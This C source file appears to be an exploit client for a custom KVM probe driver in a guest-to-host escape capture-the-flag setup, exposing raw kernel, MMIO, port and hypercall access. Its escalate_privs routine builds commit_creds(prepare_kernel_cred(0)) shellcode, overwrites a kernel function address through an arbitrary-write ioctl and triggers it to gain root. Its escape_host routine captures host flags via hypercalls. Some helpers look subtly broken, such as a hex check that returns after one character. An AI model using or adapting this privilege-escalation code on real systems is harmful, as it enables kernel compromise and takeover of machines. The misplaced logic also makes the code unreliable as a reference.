// SPDX-License-Identifier: MIT
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <inttypes.h>
#include <time.h>
#include <sys/mman.h>

#define DEVICE_PATH "/dev/kvm_probe_dev"

/* IOCTL command definitions (must match driver) */
#define IOCTL_READ_PORT          0x1001
#define IOCTL_WRITE_PORT         0x1002
#define IOCTL_READ_MMIO          0x1003
#define IOCTL_WRITE_MMIO         0x1004
#define IOCTL_ALLOC_VQ_PAGE      0x1005
#define IOCTL_FREE_VQ_PAGE       0x1006
#define IOCTL_WRITE_VQ_DESC      0x1007
#define IOCTL_TRIGGER_HYPERCALL  0x1008
#define IOCTL_READ_KERNEL_MEM    0x1009
#define IOCTL_WRITE_KERNEL_MEM   0x100A
#define IOCTL_PATCH_INSTRUCTIONS 0x100B
#define IOCTL_READ_FLAG_ADDR     0x100C
#define IOCTL_WRITE_FLAG_ADDR    0x100D
#define IOCTL_GET_KASLR_SLIDE    0x100E
#define IOCTL_VIRT_TO_PHYS       0x100F
#define IOCTL_SCAN_VA            0x1010
#define IOCTL_WRITE_VA           0x1011
#define IOCTL_HYPERCALL_ARGS     0x1012
#define IOCTL_ATTACH_VQ          0x1013
#define IOCTL_TRIGGER_VQ         0x1014
#define IOCTL_SCAN_PHYS          0x1015
#define IOCTL_FIRE_VQ_ALL        0x1016
#define IOCTL_CTF_TRIGGER_FLAG   0x1019
#define IOCTL_CTF_READ_FLAG      0x101A
#define IOCTL_CTF_WRITE_FLAG     0x101B
#define IOCTL_CTF_KASAN_TRIGGER  0x101C

/* Structures (mirror driver) */
struct port_io_data {
    unsigned short port;
    unsigned int   size;
    unsigned int   value;
};

struct mmio_data {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char *user_buffer;
    unsigned long single_value;
    unsigned int  value_size;
};

struct vq_desc_user_data {
    unsigned short index;
    unsigned long long phys_addr;
    unsigned int   len;
    unsigned short flags;
    unsigned short next_idx;
};

struct kvm_kernel_mem_read {
    unsigned long  kernel_addr;
    unsigned long  length;
    unsigned char *user_buf;
};

struct kvm_kernel_mem_write {
    unsigned long  kernel_addr;
    unsigned long  length;
    unsigned char *user_buf;
};

struct va_scan_data {
    unsigned long  va;
    unsigned long  size;
    unsigned char *user_buffer;
};

struct va_write_data {
    unsigned long  va;
    unsigned long  size;
    unsigned char *user_buffer;
};

struct hypercall_args {
    unsigned long nr;
    unsigned long arg0;
    unsigned long arg1;
    unsigned long arg2;
    unsigned long arg3;
};

struct attach_vq_data {
    unsigned int   device_id;
    unsigned long  vq_pfn;
    unsigned int   queue_index;
};

struct ctf_flag_data {
    unsigned int flag_id;
    unsigned long address;
    unsigned long value;
};

/* Safe string to unsigned long conversion with error checking */
static unsigned long safe_strtoul(const char *str, const char *desc, int base)
{
    char *endptr;
    unsigned long val;
    
    if (!str || !*str) {
        fprintf(stderr, "ERROR: Invalid %s: empty string\n", desc);
        return 0;
    }
    
    errno = 0;
    val = strtoul(str, &endptr, base);
    
    if (errno != 0) {
        fprintf(stderr, "ERROR: Invalid %s: %s\n", desc, strerror(errno));
        return 0;
    }
    
    if (*endptr != '\0') {
        fprintf(stderr, "ERROR: Invalid %s: unexpected characters '%s'\n", desc, endptr);
        return 0;
    }
    
    return val;
}

/* Function to resolve kernel symbols dynamically */
static unsigned long resolve_kernel_symbol(const char *symbol_name)
{
    FILE *fp;
    char line[512];
    unsigned long address;
    char type;
    char symbol[256];
    unsigned long result = 0;

    fp = fopen("/proc/kallsyms", "r");
    if (!fp) {
        perror("fopen /proc/kallsyms");
        return 0;
    }

    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%lx %c %s", &address, &type, symbol) == 3) {
            if (strcmp(symbol, symbol_name) == 0) {
                result = address;
                break;
            }
        }
    }

    fclose(fp);
    return result;
}

/* Function to create privilege escalation shellcode */
static int create_privilege_escalation_shellcode(unsigned char *buffer,
                                                 unsigned long prepare_kernel_cred_addr,
                                                 unsigned long commit_creds_addr)
{
    // x86_64 assembly to call prepare_kernel_cred(0) then commit_creds(result)
    unsigned char code[] = {
        0x48, 0x31, 0xFF,                         // xor rdi, rdi
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, prepare_kernel_cred_addr
        0xFF, 0xD0,                               // call rax
        0x48, 0x89, 0xC7,                         // mov rdi, rax
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, commit_creds_addr
        0xFF, 0xD0,                               // call rax
        0xC3                                      // ret
    };

    // Patch the addresses into the shellcode
    memcpy(code + 5, &prepare_kernel_cred_addr, sizeof(prepare_kernel_cred_addr));
    memcpy(code + 18, &commit_creds_addr, sizeof(commit_creds_addr));

    memcpy(buffer, code, sizeof(code));
    return sizeof(code);
}

static int is_hex_string(const char *s)
{
    if (!s || !*s) return 0;
    for (const char *p = s; *p; ++p)
        if (!isxdigit((unsigned char)*p)) return 0;
        return 1;
}

static void print_usage(const char *prog)
{
    fprintf(stderr, "Usage: %s <command> [args]\n", prog);
    fprintf(stderr, "Commands:\n");
    fprintf(stderr, "  readport <port_hex> <size:1|2|4>\n");
    fprintf(stderr, "  writeport <port_hex> <value_hex> <size:1|2|4>\n");
    fprintf(stderr, "  readmmio_val <phys_hex> <size:1|2|4|8>\n");
    fprintf(stderr, "  writemmio_val <phys_hex> <value_hex> <size:1|2|4|8>\n");
    fprintf(stderr, "  readmmio_buf <phys_hex> <len<=4096>\n");
    fprintf(stderr, "  writemmio_buf <phys_hex> <hexstring>\n");
    fprintf(stderr, "  readkvmem <kaddr_hex> <len<=4096>\n");
    fprintf(stderr, "  writekvmem <kaddr_hex> <hexstring(len<=4096)>\n");
    fprintf(stderr, "  allocvqpage | freevqpage\n");
    fprintf(stderr, "  writevqdesc <idx> <gpa_hex> <len> <flags_hex> <next>\n");
    fprintf(stderr, "  trigger_hypercall\n");
    fprintf(stderr, "  hypercall_args <nr> <arg0> <arg1> <arg2> <arg3>\n");
    fprintf(stderr, "  readflag | writeflag <value_hex>\n");
    fprintf(stderr, "  getkaslr | virt2phys <virt_hex>\n");
    fprintf(stderr, "  scanphys <start_hex> <end_hex> <step<=4096>\n");
    fprintf(stderr, "  scanva <va_hex> <len<=4096>\n");
    fprintf(stderr, "  writeva <va_hex> <hexstring(len<=4096)>\n");
    fprintf(stderr, "  attach_vq <device_id> <vq_pfn> <queue_index>\n");
    fprintf(stderr, "  trigger_vq <queue_index>\n");
    fprintf(stderr, "  fire_vq_all\n");
    fprintf(stderr, "  ctf_trigger_flag <flag_id:100|102|103>\n");
    fprintf(stderr, "  ctf_read_flag <address_hex>\n");
    fprintf(stderr, "  ctf_write_flag <address_hex> <value_hex>\n");
    fprintf(stderr, "  ctf_kasan_trigger\n");
    fprintf(stderr, "  escalate_privs\n");
    fprintf(stderr, "  escape_host\n");
}

static int parse_hex_buffer(const char *hex, unsigned char **out, size_t *out_len)
{
    size_t n = strlen(hex);
    if (n == 0 || (n & 1)) return -1;
    if (!is_hex_string(hex)) return -1;
    size_t bytes = n / 2;
    if (bytes > 4096) return -1;

    unsigned char *buf = malloc(bytes);
    if (!buf) return -1;

    for (size_t i = 0; i < bytes; ++i) {
        unsigned int v;
        if (sscanf(hex + 2 * i, "%2x", &v) != 1) { free(buf); return -1; }
        buf[i] = (unsigned char)v;
    }
    *out = buf;
    *out_len = bytes;
    return 0;
}

/* FIXED: escalate_privs with proper validation and error handling */
static int escalate_privs(int fd)
{
    unsigned long kaslr_slide = 0;
    unsigned long p_set_memory_ro;
    unsigned long commit_creds_addr, prepare_kernel_cred_addr;
    unsigned long shellcode_addr;
    unsigned char *shellcode_buf = NULL;
    int ret = -1;

    printf("[*] Starting privilege escalation...\n");

    /* 1. Get KASLR slide */
    if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &kaslr_slide) < 0) {
        perror("IOCTL_GET_KASLR_SLIDE");
        fprintf(stderr, "[-] Failed to get KASLR slide\n");
        return -1;
    }
    printf("[+] KASLR slide: 0x%lx\n", kaslr_slide);

    /* 2. Resolve kernel symbols dynamically */
    unsigned long kernel_base = resolve_kernel_symbol("_text");
    if (!kernel_base) {
        fprintf(stderr, "[-] Failed to resolve kernel base\n");
        return -1;
    }

    prepare_kernel_cred_addr = resolve_kernel_symbol("prepare_kernel_cred");
    commit_creds_addr = resolve_kernel_symbol("commit_creds");

    if (!prepare_kernel_cred_addr || !commit_creds_addr) {
        fprintf(stderr, "[-] Failed to resolve required symbols\n");
        fprintf(stderr, "    prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred_addr);
        fprintf(stderr, "    commit_creds: 0x%lx\n", commit_creds_addr);
        return -1;
    }

    printf("[+] Kernel base: 0x%lx\n", kernel_base);
    printf("[+] prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred_addr);
    printf("[+] commit_creds: 0x%lx\n", commit_creds_addr);

    /* 3. Calculate set_memory_ro address */
    p_set_memory_ro = resolve_kernel_symbol("set_memory_ro");
    if (!p_set_memory_ro) {
        fprintf(stderr, "[-] Failed to resolve set_memory_ro\n");
        return -1;
    }
    printf("[+] set_memory_ro: 0x%lx\n", p_set_memory_ro);

    /* 4. Craft and allocate shellcode */
    shellcode_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (shellcode_buf == MAP_FAILED) {
        perror("mmap");
        fprintf(stderr, "[-] Failed to allocate shellcode memory\n");
        return -1;
    }
    shellcode_addr = (unsigned long)shellcode_buf;
    printf("[+] Shellcode mapped at: 0x%lx\n", shellcode_addr);

    /* 5. Create the shellcode */
    int shellcode_size = create_privilege_escalation_shellcode(shellcode_buf,
                                                               prepare_kernel_cred_addr,
                                                               commit_creds_addr);
    if (shellcode_size <= 0) {
        fprintf(stderr, "[-] Failed to create shellcode\n");
        goto cleanup;
    }

    printf("[+] Shellcode created (%d bytes)\n", shellcode_size);

    /* 6. Overwrite set_memory_ro pointer with shellcode address */
    struct kvm_kernel_mem_write w = {
        .kernel_addr = p_set_memory_ro,
        .length = sizeof(unsigned long),
        .user_buf = (unsigned char *)&shellcode_addr
    };
    if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &w) < 0) {
        perror("IOCTL_WRITE_KERNEL_MEM (exploit)");
        fprintf(stderr, "[-] Failed to overwrite set_memory_ro\n");
        goto cleanup;
    }

    printf("[+] set_memory_ro pointer overwritten. Triggering payload...\n");

    /* 7. Trigger the exploit by calling IOCTL_PATCH_INSTRUCTIONS */
    struct va_scan_data req = {
        .va = kernel_base, // A valid kernel VA
        .size = 1,
        .user_buffer = shellcode_buf
    };
    if (ioctl(fd, IOCTL_PATCH_INSTRUCTIONS, &req) < 0) {
        perror("IOCTL_PATCH_INSTRUCTIONS (trigger)");
        fprintf(stderr, "[-] Failed to trigger payload\n");
        goto cleanup;
    }

    /* 8. Check if we are now root */
    if (getuid() == 0) {
        printf("[+] SUCCESS! We are root!\n");
        ret = 0;
    } else {
        printf("[-] Exploit failed to elevate privileges. UID=%u\n", getuid());
        printf("    Note: This exploit requires proper KVM context and valid function pointers!\n");
        ret = -1;
    }

cleanup:
    if (shellcode_buf && shellcode_buf != MAP_FAILED) {
        munmap(shellcode_buf, 0x1000);
    }
    return ret;
}

/* FIXED: escape_host with proper return value handling */
static int escape_host(int fd)
{
    int ret = -1;
    printf("[*] Starting host escape attack...\n");

    /* Use the CTF-specific commands instead of generic memory operations */
    printf("[*] Writing to CTF write flag address...\n");
    struct ctf_flag_data write_data = {
        .address = 0x64279a8UL, // WRITE_FLAG_PA
        .value = 0xdeadbeef41424344ULL
    };
    
    if (ioctl(fd, IOCTL_CTF_WRITE_FLAG, &write_data) < 0) {
        perror("CTF_WRITE_FLAG");
        fprintf(stderr, "[-] Failed to write CTF flag\n");
        return -1;
    }
    printf("[+] Write successful.\n");

    /* Trigger the required hypercall using CTF-specific command */
    printf("[*] Triggering CTF hypercall 100...\n");
    struct ctf_flag_data trigger_data = {
        .flag_id = 100
    };
    
    if (ioctl(fd, IOCTL_CTF_TRIGGER_FLAG, &trigger_data) < 0) {
        perror("CTF_TRIGGER_FLAG");
        fprintf(stderr, "[-] Failed to trigger hypercall\n");
        return -1;
    }
    printf("[+] Hypercall triggered. Host flag should be captured.\n");

    /* Read the CTF read flag using the new command */
    printf("[*] Reading CTF read flag...\n");
    struct ctf_flag_data read_data = {
        .address = 0x695ee10UL // READ_FLAG_PA
    };
    
    if (ioctl(fd, IOCTL_CTF_READ_FLAG, &read_data) < 0) {
        perror("CTF_READ_FLAG");
        fprintf(stderr, "[-] Failed to read CTF flag\n");
        return -1;
    }

    printf("[+] SUCCESS! Captured flag value: 0x%016lx\n", read_data.value);
    
    /* Optional: Try to read more flag data if available */
    printf("[*] Attempting to read additional flag data...\n");
    
    /* Try reading from virtual address as well */
    struct ctf_flag_data read_va_data = {
        .address = 0xffffffff82b5ee10UL // READ_FLAG_VA (adjusted for KASLR)
    };
    
    if (ioctl(fd, IOCTL_CTF_READ_FLAG, &read_va_data) >= 0) {
        printf("[+] VA flag value: 0x%016lx\n", read_va_data.value);
    } else {
        printf("[!] VA read failed (expected if KASLR is enabled)\n");
    }
    
    ret = 0;
    return ret;
}

int main(int argc, char **argv)
{
    if (argc < 2) { print_usage(argv[0]); return 1; }
    const char *cmd = argv[1];
    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        perror("open " DEVICE_PATH);
        return 1;
    }

    if (strcmp(cmd, "readport") == 0) {
        if (argc != 4) { print_usage(argv[0]); goto out; }
        unsigned short port = safe_strtoul(argv[2], "port", 16);
        unsigned int size = safe_strtoul(argv[3], "size", 10);
        if (!port && errno) goto out;
        if (size != 1 && size != 2 && size != 4) { 
            fprintf(stderr, "Invalid size: must be 1, 2, or 4\n"); 
            goto out; 
        }
        struct port_io_data p = { .port = port, .size = size };
        if (ioctl(fd, IOCTL_READ_PORT, &p) < 0) perror("READ_PORT");
        else printf("port[0x%X] => 0x%X (%u bytes)\n", p.port, p.value, p.size);

    } else if (strcmp(cmd, "writeport") == 0) {
        if (argc != 5) { print_usage(argv[0]); goto out; }
        if (!is_hex_string(argv[3])) { fprintf(stderr, "value must be hex\n"); goto out; }
        unsigned short port = safe_strtoul(argv[2], "port", 16);
        unsigned int value = safe_strtoul(argv[3], "value", 16);
        unsigned int size = safe_strtoul(argv[4], "size", 10);
        if (!port && errno) goto out;
        if (size != 1 && size != 2 && size != 4) { 
            fprintf(stderr, "Invalid size: must be 1, 2, or 4\n"); 
            goto out; 
        }
        struct port_io_data p = { .port = port, .value = value, .size = size };
        if (ioctl(fd, IOCTL_WRITE_PORT, &p) < 0) perror("WRITE_PORT");
        else printf("port[0x%X] <= 0x%X (%u bytes)\n", p.port, p.value, p.size);

    } else if (strcmp(cmd, "readmmio_val") == 0) {
        if (argc != 4) { print_usage(argv[0]); goto out; }
        unsigned long phys = safe_strtoul(argv[2], "physical address", 16);
        unsigned long size = safe_strtoul(argv[3], "size", 10);
        if (!phys && errno) goto out;
        if (size != 1 && size != 2 && size != 4 && size != 8) { 
            fprintf(stderr, "Invalid size: must be 1, 2, 4, or 8\n"); 
            goto out; 
        }
        struct mmio_data d = {
            .phys_addr = phys,
            .size = size,
            .user_buffer = NULL,
            .value_size = size
        };
        d.user_buffer = malloc(d.size);
        if (!d.user_buffer) { perror("malloc"); goto out; }
        if (ioctl(fd, IOCTL_READ_MMIO, &d) < 0) perror("READ_MMIO");
        else {
            unsigned long long v = 0;
            memcpy(&v, d.user_buffer, d.size);
            printf("MMIO[0x%lX] => 0x%llX (%lu bytes)\n", d.phys_addr, v, d.size);
        }
        free(d.user_buffer);

    } else if (strcmp(cmd, "writemmio_val") == 0) {
        if (argc != 5) { print_usage(argv[0]); goto out; }
        if (!is_hex_string(argv[3])) { fprintf(stderr, "value must be hex\n"); goto out; }
        unsigned long phys = safe_strtoul(argv[2], "physical address", 16);
        unsigned long long value = safe_strtoul(argv[3], "value", 16);
        unsigned int size = safe_strtoul(argv[4], "size", 10);
        if (!phys && errno) goto out;
        if (size != 1 && size != 2 && size != 4 && size != 8) {
            fprintf(stderr, "Invalid size: must be 1, 2, 4, or 8\n");
            goto out;
        }
        struct mmio_data d = {
            .phys_addr = phys,
            .single_value = value,
            .value_size = size
        };
        if (ioctl(fd, IOCTL_WRITE_MMIO, &d) < 0) perror("WRITE_MMIO");
        else printf("MMIO[0x%lX] <= 0x%llX (%u bytes)\n", d.phys_addr, d.single_value, d.value_size);

    } else if (strcmp(cmd, "readmmio_buf") == 0) {
        if (argc != 4) { print_usage(argv[0]); goto out; }
        unsigned long phys = safe_strtoul(argv[2], "physical address", 16);
        unsigned long len = safe_strtoul(argv[3], "length", 10);
        if (!phys && errno) goto out;
        if (len == 0 || len > 4096) { 
            fprintf(stderr, "len must be 1..4096\n"); 
            goto out; 
        }
        unsigned char *buffer = malloc(len);
        if (!buffer) { perror("malloc"); goto out; }
        struct mmio_data d = {
            .phys_addr = phys,
            .size = len,
            .user_buffer = buffer
        };
        if (ioctl(fd, IOCTL_READ_MMIO, &d) < 0) {
            perror("READ_MMIO");
            free(buffer);
            goto out;
        }
        printf("MMIO[0x%lX]:", d.phys_addr);
        for (unsigned long i = 0; i < len; ++i) printf("%02X", buffer[i]);
        printf("\n");
        free(buffer);

    } else if (strcmp(cmd, "writemmio_buf") == 0) {
        if (argc != 4) { print_usage(argv[0]); goto out; }
        unsigned long phys = safe_strtoul(argv[2], "physical address", 16);
        if (!phys && errno) goto out;
        unsigned char *buf = NULL;
        size_t blen = 0;
        if (parse_hex_buffer(argv[3], &buf, &blen) != 0) {
            fprintf(stderr, "bad hexstring\n");
            goto out;
        }
        if (blen == 0) {
            free(buf);
            fprintf(stderr, "empty buffer\n");
            goto out;
        }
        /* Write byte-by-byte loop */
        for (size_t i = 0; i < blen; ++i) {
            struct mmio_data d = {
                .phys_addr = phys + i,
                .single_value = buf[i],
                .value_size = 1
            };
            if (ioctl(fd, IOCTL_WRITE_MMIO, &d) < 0) {
                perror("WRITE_MMIO");
                break;
            }
        }
        free(buf);
        printf("wrote %zu bytes to MMIO\n", blen);

    } else if (strcmp(cmd, "readkvmem") == 0) {
        if (argc != 4) { print_usage(argv[0]); goto out; }
        unsigned long kaddr = safe_strtoul(argv[2], "kernel address", 16);
        unsigned long len = safe_strtoul(argv[3], "length", 10);
        if (!kaddr && errno) goto out;
        if (len == 0 || len > 4096) { 
            fprintf(stderr, "len must be 1..4096\n"); 
            goto out; 
        }
        unsigned char *buffer = malloc(len);
        if (!buffer) { perror("malloc"); goto out; }
        struct kvm_kernel_mem_read r = {
            .kernel_addr = kaddr,
            .length = len,
            .user_buf = buffer
        };
        if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &r) < 0) {
            perror("READ_KERNEL_MEM");
            free(buffer);
            goto out;
        }
        printf("KVMEM[0x%lX]:", r.kernel_addr);
        for (unsigned long i = 0; i < len; ++i) printf("%02X", buffer[i]);
        printf("\n");
        free(buffer);

    } else if (strcmp(cmd, "writekvmem") == 0) {
        if (argc != 4) { print_usage(argv[0]); goto out; }
        unsigned long kaddr = safe_strtoul(argv[2], "kernel address", 16);
        if (!kaddr && errno) goto out;
        unsigned char *buf = NULL;
        size_t blen = 0;
        if (parse_hex_buffer(argv[3], &buf, &blen) != 0) {
            fprintf(stderr, "bad hexstring\n");
            goto out;
        }
        struct kvm_kernel_mem_write w = {
            .kernel_addr = kaddr,
            .length = blen,
            .user_buf = buf
        };
        if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &w) < 0) {
            perror("WRITE_KERNEL_MEM");
            free(buf);
            goto out;
        }
        printf("Wrote %zu bytes to 0x%lX\n", blen, w.kernel_addr);
        free(buf);

    } else if (strcmp(cmd, "allocvqpage") == 0) {
        unsigned long pfn = 0;
        if (ioctl(fd, IOCTL_ALLOC_VQ_PAGE, &pfn) < 0) perror("ALLOC_VQ_PAGE");
        else {
            printf("VQ PFN: 0x%lX | Guest PA must be set via KVM_SET_USER_MEMORY_REGION\n", pfn);
        }

    } else if (strcmp(cmd, "freevqpage") == 0) {
        if (ioctl(fd, IOCTL_FREE_VQ_PAGE) < 0) perror("FREE_VQ_PAGE");
        else printf("Freed VQ page\n");

    } else if (strcmp(cmd, "writevqdesc") == 0) {
        if (argc != 7) { print_usage(argv[0]); goto out; }
        struct vq_desc_user_data d;
        d.index     = safe_strtoul(argv[2], "index", 10);
        d.phys_addr = safe_strtoul(argv[3], "physical address", 16);
        d.len       = safe_strtoul(argv[4], "length", 10);
        d.flags     = safe_strtoul(argv[5], "flags", 16);
        d.next_idx  = safe_strtoul(argv[6], "next index", 10);
        if (ioctl(fd, IOCTL_WRITE_VQ_DESC, &d) < 0) perror("WRITE_VQ_DESC");
        else printf("VQ desc[%hu] programmed\n", d.index);

    } else if (strcmp(cmd, "trigger_hypercall") == 0) {
        unsigned long ret = 0;
        if (ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &ret) < 0) perror("TRIGGER_HYPERCALL");
        else printf("Hypercall returned: 0x%lx\n", ret);

    } else if (strcmp(cmd, "hypercall_args") == 0) {
        if (argc != 7) { print_usage(argv[0]); goto out; }
        struct hypercall_args a = {
            .nr   = safe_strtoul(argv[2], "hypercall number", 10),
            .arg0 = safe_strtoul(argv[3], "arg0", 16),
            .arg1 = safe_strtoul(argv[4], "arg1", 16),
            .arg2 = safe_strtoul(argv[5], "arg2", 16),
            .arg3 = safe_strtoul(argv[6], "arg3", 16),
        };
        
        if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &a) < 0) {
            perror("HYPERCALL_ARGS");
        } else {
            /* Driver returns unsigned long - don't interpret as signed */
            unsigned long ret_val = a.arg0;  /* Driver stores return in arg0 */
            printf("Hypercall(%lu) returned: 0x%lx (unsigned)\n", a.nr, ret_val);
            
            /* Only interpret special values if they're within error range */
            if (ret_val == 0xFFFFFFFFFFFFFFFFUL) {
                fprintf(stderr, "Driver blocked unsafe hypercall (CTF_SAFE_MODE)\n");
            }
        }

    } else if (strcmp(cmd, "readflag") == 0) {
        unsigned long value = 0;
        if (ioctl(fd, IOCTL_READ_FLAG_ADDR, &value) < 0) perror("READ_FLAG_ADDR");
        else printf("Flag value: 0x%lx\n", value);

    } else if (strcmp(cmd, "writeflag") == 0) {
        if (argc != 3 || !is_hex_string(argv[2])) { print_usage(argv[0]); goto out; }
        unsigned long value = safe_strtoul(argv[2], "value", 16);
        if (ioctl(fd, IOCTL_WRITE_FLAG_ADDR, &value) < 0) perror("WRITE_FLAG_ADDR");
        else printf("Flag updated to 0x%lx\n", value);

    } else if (strcmp(cmd, "getkaslr") == 0) {
        unsigned long slide = 0;
        if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &slide) < 0) perror("GET_KASLR_SLIDE");
        else printf("KASLR slide: 0x%lx\n", slide);

    } else if (strcmp(cmd, "virt2phys") == 0) {
        if (argc != 3) { print_usage(argv[0]); goto out; }
        unsigned long virt = safe_strtoul(argv[2], "virtual address", 16);
        if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &virt) < 0) perror("VIRT_TO_PHYS");
        else printf("virt 0x%lX -> phys 0x%lX\n", safe_strtoul(argv[2], "virtual address", 16), virt);

    } else if (strcmp(cmd, "scanphys") == 0) {
        if (argc != 5) { print_usage(argv[0]); goto out; }
        unsigned long start = safe_strtoul(argv[2], "start address", 16);
        unsigned long end   = safe_strtoul(argv[3], "end address", 16);
        unsigned long step  = safe_strtoul(argv[4], "step", 10);
        if (!start && errno) goto out;
        if (!step || step > 4096 || start >= end) { 
            fprintf(stderr, "invalid range/step\n"); 
            goto out; 
        }
        unsigned char *buf = malloc(step);
        if (!buf) { perror("malloc"); goto out; }
        for (unsigned long addr = start; addr < end; addr += step) {
            struct mmio_data d = { .phys_addr = addr, .size = step, .user_buffer = buf };
            if (ioctl(fd, IOCTL_SCAN_PHYS, &d) < 0) {
                printf("0x%lX: ERROR\n", addr);
            } else {
                printf("0x%lX:", addr);
                for (unsigned long i = 0; i < step; ++i) printf("%02X", buf[i]);
                printf("\n");
            }
        }
        free(buf);

    } else if (strcmp(cmd, "scanva") == 0) {
        if (argc != 4) { print_usage(argv[0]); goto out; }
        unsigned long va = safe_strtoul(argv[2], "virtual address", 16);
        unsigned long len = safe_strtoul(argv[3], "length", 10);
        if (!va && errno) goto out;
        if (!len || len > 4096) { 
            fprintf(stderr, "len must be 1..4096\n"); 
            goto out; 
        }
        unsigned char *buf = malloc(len);
        if (!buf) { perror("malloc"); goto out; }
        struct va_scan_data req = { .va = va, .size = len, .user_buffer = buf };
        if (ioctl(fd, IOCTL_SCAN_VA, &req) < 0) perror("SCAN_VA");
        else {
            printf("VA[0x%lX]:", req.va);
            for (unsigned long i = 0; i < len; ++i) printf("%02X", buf[i]);
            printf("\n");
        }
        free(buf);

    } else if (strcmp(cmd, "writeva") == 0) {
        if (argc != 4) { print_usage(argv[0]); goto out; }
        unsigned long va = safe_strtoul(argv[2], "virtual address", 16);
        if (!va && errno) goto out;
        unsigned char *buf = NULL;
        size_t blen = 0;
        if (parse_hex_buffer(argv[3], &buf, &blen) != 0) {
            fprintf(stderr, "bad hexstring\n");
            goto out;
        }
        struct va_write_data req = {
            .va = va,
            .size = blen,
            .user_buffer = buf
        };
        if (ioctl(fd, IOCTL_WRITE_VA, &req) < 0) {
            perror("WRITE_VA");
            free(buf);
            goto out;
        }
        printf("Wrote %zu bytes to VA 0x%lX\n", blen, req.va);
        free(buf);

    } else if (strcmp(cmd, "attach_vq") == 0) {
        if (argc != 5) { print_usage(argv[0]); goto out; }
        struct attach_vq_data data = {
            .device_id = safe_strtoul(argv[2], "device ID", 10),
            .vq_pfn = safe_strtoul(argv[3], "VQ PFN", 16),
            .queue_index = safe_strtoul(argv[4], "queue index", 10)
        };
        if (ioctl(fd, IOCTL_ATTACH_VQ, &data) < 0) perror("ATTACH_VQ");
        else printf("Attached VQ to device %u\n", data.device_id);

    } else if (strcmp(cmd, "trigger_vq") == 0) {
        if (argc != 3) { print_usage(argv[0]); goto out; }
        unsigned int qindex = safe_strtoul(argv[2], "queue index", 10);
        unsigned long ret = 0;
        if (ioctl(fd, IOCTL_TRIGGER_VQ, &qindex) < 0) perror("TRIGGER_VQ");
        else printf("Triggered VQ %u, ret: 0x%lx\n", qindex, ret);

    } else if (strcmp(cmd, "fire_vq_all") == 0) {
        if (ioctl(fd, IOCTL_FIRE_VQ_ALL) < 0) perror("FIRE_VQ_ALL");
        else printf("Fired all VQs\n");

    } else if (strcmp(cmd, "ctf_trigger_flag") == 0) {
        if (argc != 3) { print_usage(argv[0]); goto out; }
        struct ctf_flag_data data = {
            .flag_id = safe_strtoul(argv[2], "flag ID", 10)
        };
        unsigned long ret = 0;
        if (ioctl(fd, IOCTL_CTF_TRIGGER_FLAG, &data) < 0) perror("CTF_TRIGGER_FLAG");
        else printf("CTF flag %u triggered, ret: 0x%lx\n", data.flag_id, ret);

    } else if (strcmp(cmd, "ctf_read_flag") == 0) {
        if (argc != 3) { print_usage(argv[0]); goto out; }
        struct ctf_flag_data data = {
            .address = safe_strtoul(argv[2], "address", 16)
        };
        if (ioctl(fd, IOCTL_CTF_READ_FLAG, &data) < 0) perror("CTF_READ_FLAG");
        else printf("CTF flag at 0x%lx: 0x%016lx\n", data.address, data.value);

    } else if (strcmp(cmd, "ctf_write_flag") == 0) {
        if (argc != 4) { print_usage(argv[0]); goto out; }
        struct ctf_flag_data data = {
            .address = safe_strtoul(argv[2], "address", 16),
            .value = safe_strtoul(argv[3], "value", 16)
        };
        if (ioctl(fd, IOCTL_CTF_WRITE_FLAG, &data) < 0) perror("CTF_WRITE_FLAG");
        else printf("Wrote 0x%lx to CTF flag at 0x%lx\n", data.value, data.address);

    } else if (strcmp(cmd, "ctf_kasan_trigger") == 0) {
        if (ioctl(fd, IOCTL_CTF_KASAN_TRIGGER) < 0) perror("CTF_KASAN_TRIGGER");
        else printf("KASAN violation triggered (simulated)\n");

    } else if (strcmp(cmd, "escalate_privs") == 0) {
        escalate_privs(fd);
        
    } else if (strcmp(cmd, "escape_host") == 0) {
        escape_host(fd);
        
    } else {
        fprintf(stderr, "Unknown command: %s\n", cmd);
        print_usage(argv[0]);
    }

out:
    close(fd);
    return 0;
}
